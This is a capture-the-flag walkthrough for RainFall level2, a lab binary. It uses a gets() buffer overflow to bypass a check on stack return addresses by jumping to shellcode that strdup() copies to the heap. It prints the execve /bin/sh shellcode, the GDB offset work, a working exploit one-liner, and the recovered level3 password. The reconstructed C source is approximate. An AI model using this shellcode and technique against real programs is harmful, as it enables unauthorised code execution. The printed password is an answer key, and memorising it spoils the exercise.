# Level2: Buffer Overflow with Heap Execution

## Challenge Overview

In level2, we encounter a program that reads user input into a buffer and then copies it to the heap using `strdup()`. The program includes a protection mechanism that checks if the return address has been changed to point to the stack, but doesn't prevent redirection to the heap.

## Source Code Analysis

The source code for this level reveals the vulnerability:

```c
#include <stdio.h>    // For fflush, gets, printf, puts
#include <stdlib.h>   // For _exit
#include <string.h>   // For strdup
#include <unistd.h>   // Alternative for _exit
#include <stdint.h>   // For uint32_t

void p(void);

int main(void)
{
  p();
  return 0;
}

void p(void)
{
  uint32_t return_address;
  char buffer[76];

  // Clear the stdout buffer
  fflush(stdout);

  // Read input into buffer (vulnerable to buffer overflow)
  gets(buffer);

  // Check if return address starts with 0xb0000000 (stack address range)
  // This is a protection against typical stack buffer overflow exploits
  if ((return_address & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", return_address);
    /* Process terminates here */
    _exit(1);
  }

  // Echo the input back to the user
  puts(buffer);

  // Duplicate the buffer (allocates heap memory)
  strdup(buffer);

  return;
}
```

Key observations:

1. The program uses `gets()`, which is vulnerable to buffer overflow
2. There's a protection check against stack-based exploits (addresses starting with 0xb)
3. The `strdup()` function copies our input to the heap

## The Vulnerability

This program has two key vulnerabilities:

1. **Buffer Overflow**: The use of `gets()` allows us to write beyond the 76-byte buffer
2. **Exploit Redirection**: Even though there's a check against stack-based exploits, we can redirect execution to the heap, which has addresses that typically start with 0x8

## Memory Layout and Protection Bypass

The protection check in this program targets stack addresses:

```c
if ((return_address & 0xb0000000) == 0xb0000000)
```

This checks if the highest 4 bits of the address are 0xb (1011 in binary). This is a common range for stack addresses in 32-bit Linux systems, but heap addresses typically start with 0x8, allowing us to bypass this check.

## Exploitation Strategy

Our approach leverages the heap memory allocated by `strdup()`:

1. Create a payload with a shellcode (a code that gives us a shell) at the beginning
2. Let `strdup()` copy our shellcode to the heap
3. Overflow the buffer to overwrite the return address with the heap address
4. When the function returns, execution jumps to our shellcode on the heap

## Finding the Heap Address

We used GDB to find where `strdup()` places our input:

```bash
level2@RainFall:~$ gdb -q ./level2
(gdb) disas p
# Looking at the disassembly to find the ret instruction
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
0x0804853d <+105>:   leave
0x0804853e <+106>:   ret

(gdb) break *0x0804853e  # Set breakpoint at ret instruction
(gdb) run
# Input a test string
test

Breakpoint 1, 0x0804853e in p ()
(gdb) x/s $eax  # Examine the string at the address returned by strdup
0x804a008:       "test"
```

We discovered that `strdup()` consistently places our input at address `0x804a008` on the heap.

## Creating the Exploit

With this knowledge, we crafted an exploit with:

1. Shellcode to spawn a shell
2. Padding to fill the buffer
3. A value to overwrite the 4 bytes of the stack frame (can be arbitrary)
4. The heap address (0x804a008) to overwrite the return address

### Retrieving the Shellcode

To execute `/bin/sh`, we needed a shellcode that performs the `execve` system call. Instead of writing the shellcode ourselves, we retrieved a pre-written shellcode from [Shell-Storm](http://shell-storm.org/shellcode/), a well-known repository for shellcode.

We searched for "Linux/x86 - execve /bin/sh" on Shell-Storm and found [a compact 21-byte shellcode](https://shell-storm.org/shellcode/files/shellcode-575.html):

```assembly
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

This shellcode spawns a shell by invoking the `execve` system call with `/bin/sh` as the argument.

### Finding the Exact Overflow Offsets

To verify the exact buffer layout and required offsets, we created a test pattern with different character sequences:

```bash
level2@RainFall:~$ python -c 'print("A"*76 + "B"*4 + "C"*4 + "D"*4)' > /tmp/test2
level2@RainFall:~$ gdb -q ./level2 

(gdb) run < /tmp/test2
Breakpoint 1, 0x0804853e in p () # Breakpoint at the return instruction
(gdb) x/s $eax
0x804a008:       'A' <repeats 64 times>, "CCCCAAAAAAAABBBBCCCCDDDD"
(gdb) info frame
Stack level 0, frame at 0xbffff630:
 eip = 0x804853e in p; saved eip 0x43434343
 called by frame at 0xbffff634
 Arglist at 0x42424242, args: 
 Locals at 0x42424242, Previous frame's sp is 0xbffff630
 Saved registers:
  eip at 0xbffff62c
```

This GDB session confirms several critical pieces of information:

1. The saved return address (EIP) is `0x43434343`, which is "CCCC" in ASCII
2. The stack frame data is shown as `0x42424242`, which is "BBBB" in ASCII
3. The heap address where our input is copied is consistently `0x804a008`
4. The buffer overflow occurs exactly as expected:
   - First 76 bytes fill the buffer
   - Next 4 bytes overwrite stack frame data
   - Next 4 bytes overwrite the return address

This confirms the exact layout needed for our exploit:
- Shellcode at the beginning (will be duplicated at 0x804a008)
- Padding to fill the buffer (55 bytes after our 21-byte shellcode)
- 4 bytes to overwrite stack frame data (can be any value)
- 4 bytes to overwrite the return address with 0x804a008 (heap address)

## The Final Exploit

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*55 + "BBBB" + "\x08\xa0\x04\x08"'; cat) | ./level2
```

Breaking it down:

- Shellcode (21 bytes): `\x6a\x0b\x58...` - Spawns /bin/sh
- Padding (55 bytes): `"A"*55` - Fills the remainder of the 76-byte buffer
- EBP overwrite (4 bytes): `"BBBB"` - Arbitrary value for the stack frame data
- Return address (4 bytes): `\x08\xa0\x04\x08` - 0x804a008 in little-endian format. Check level1's walkthrough for more details about little-endian.
- `cat` - Keeps stdin open for shell interaction. Check level1's walkthrough for more details.


## Getting the Password

After running the exploit, we get a shell and can read the password:

```bash
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Moving to Next Level

With the password obtained, we can now move to level3:

```bash
level2@RainFall:~$ su level3
Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
level3@RainFall:~$
```

## Lessons Learned

1. **Stack Protection Isn't Enough**: Simple checks on return addresses can be bypassed by using alternative memory regions like the heap.

2. **Memory Layout Understanding is Crucial**: Knowing how memory is organized (stack vs heap) allows for creative exploitation techniques.

3. **Dangerous Functions**: `gets()` remains dangerous regardless of additional checks because it allows unlimited input.

4. **Stack Frame Integrity**: When redirecting execution, properly managing the stack frame (including the EBP) is important for reliable exploits.